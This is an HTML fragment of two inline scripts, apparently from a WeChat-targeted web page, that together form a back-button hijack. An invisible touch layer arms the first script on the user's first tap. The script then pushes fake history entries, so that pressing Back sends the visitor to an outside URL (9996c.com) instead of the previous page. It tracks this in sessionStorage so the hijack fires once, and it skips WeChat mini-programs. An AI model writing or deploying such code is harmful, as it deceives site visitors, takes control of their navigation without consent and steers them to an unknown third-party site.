    <script>
      (function () {
        if (window.__AD_BRIDGE_INIT__) return;
        window.__AD_BRIDGE_INIT__ = true;
  
        var HOST_WHITELIST = [
          'k112w.com',
          'www.k112w.com',
          'www.enggei.com',
          'k12w.com',
          'www.k12w.com'
        ];
  
        var FIXED_JUMP_URL = 'https://9996c.com/8292A';
  
        var PAGE_KEY = encodeURIComponent(
          (window.location.hostname || '') +
          (window.location.pathname || '/') +
          (window.location.search || '')
        );
  
        var STORAGE_KEY_ARMED = 'enggei_ad_jump_armed_' + PAGE_KEY;
        var STORAGE_KEY_USED = 'enggei_ad_jump_used_' + PAGE_KEY;
  
        var armed = false;
        var jumped = false;
  
        function getHost() {
          return (window.location.hostname || '').toLowerCase();
        }
  
        function isAllowedHost() {
          return HOST_WHITELIST.indexOf(getHost()) !== -1;
        }
  
        function isWeChatBrowser() {
          return /MicroMessenger/i.test(navigator.userAgent || '');
        }
  
        function isMiniProgramByUA() {
          return /miniProgram/i.test(navigator.userAgent || '');
        }
  
        function detectMiniProgram(callback) {
          if (!isWeChatBrowser()) {
            callback(false);
            return;
          }
  
          if (
            typeof wx !== 'undefined' &&
            wx.miniProgram &&
            typeof wx.miniProgram.getEnv === 'function'
          ) {
            wx.miniProgram.getEnv(function (res) {
              callback(!!(res && res.miniprogram));
            });
            return;
          }
  
          callback(isMiniProgramByUA());
        }
  
        function hasUsed() {
          try {
            return sessionStorage.getItem(STORAGE_KEY_USED) === '1';
          } catch (e) {
            return false;
          }
        }
  
        function markUsed() {
          jumped = true;
          armed = false;
  
          try {
            sessionStorage.setItem(STORAGE_KEY_USED, '1');
            sessionStorage.removeItem(STORAGE_KEY_ARMED);
          } catch (e) {}
        }
  
        function markArmed() {
          if (hasUsed()) return;
  
          armed = true;
  
          try {
            sessionStorage.setItem(STORAGE_KEY_ARMED, '1');
          } catch (e) {}
        }
  
        function isArmed() {
          if (hasUsed()) return false;
          if (armed) return true;
  
          try {
            return sessionStorage.getItem(STORAGE_KEY_ARMED) === '1';
          } catch (e) {
            return false;
          }
        }
  
        function buildBridgeUrl() {
          var path = window.location.pathname || '/';
          var search = window.location.search || '';
          return path + search + '#__ad_bridge__';
        }
  
        function buildContentUrl() {
          var path = window.location.pathname || '/';
          var search = window.location.search || '';
          return path + search;
        }
  
        function installVirtualPreviousPage() {
          if (!isAllowedHost()) return;
          if (!isWeChatBrowser()) return;
          if (hasUsed()) return;
          if (!isArmed()) return;
  
          try {
            history.pushState({ pageType: 'ad-bridge' }, '', buildBridgeUrl());
            history.pushState({ pageType: 'content-live' }, '', buildContentUrl());
          } catch (e) {}
        }
  
        function jumpToAd() {
          if (jumped) return;
          if (hasUsed()) return;
  
          markUsed();
  
          location.href = FIXED_JUMP_URL;
        }
  
        function onBackState(e) {
          if (!isAllowedHost()) return;
          if (!isWeChatBrowser()) return;
          if (hasUsed()) return;
          if (!isArmed()) return;
  
          var state = e.state || {};
  
          if (state.pageType === 'ad-bridge') {
            jumpToAd();
          }
        }
  
        function armOnce() {
          if (hasUsed()) return;
          if (isArmed()) return;
  
          markArmed();
          installVirtualPreviousPage();
        }
  
        function start() {
          if (!isAllowedHost()) return;
          if (!isWeChatBrowser()) return;
          if (hasUsed()) return;
  
          detectMiniProgram(function (isMini) {
            if (isMini) return;
  
            window.addEventListener('popstate', onBackState);
  
            window.addEventListener('pageshow', function () {
              if (hasUsed()) return;
  
              if (isArmed()) {
                setTimeout(function () {
                  installVirtualPreviousPage();
                }, 0);
              }
            });
  
            document.addEventListener('visibilitychange', function () {
              if (hasUsed()) return;
  
              if (!document.hidden && isArmed()) {
                setTimeout(function () {
                  installVirtualPreviousPage();
                }, 0);
              }
            });
          });
        }
  
        window.EnggeiAdBridge = {
          start: start,
          armOnce: armOnce,
          jumpToAd: jumpToAd
        };
  
        start();
      })();
    </script>
  
    <script>
      (function () {
        var layer = document.getElementById('guardTouchLayer');
  
        function handleFirstTouch() {
          if (
            window.EnggeiAdBridge &&
            typeof window.EnggeiAdBridge.armOnce === 'function'
          ) {
            window.EnggeiAdBridge.armOnce();
          }
  
          if (layer) {
            layer.style.display = 'none';
          }
        }
  
        if (layer) {
          layer.addEventListener('click', handleFirstTouch, {
            passive: true,
            once: true
          });
  
          layer.addEventListener('touchstart', handleFirstTouch, {
            passive: true,
            once: true
          });
        }
      })();
    </script>
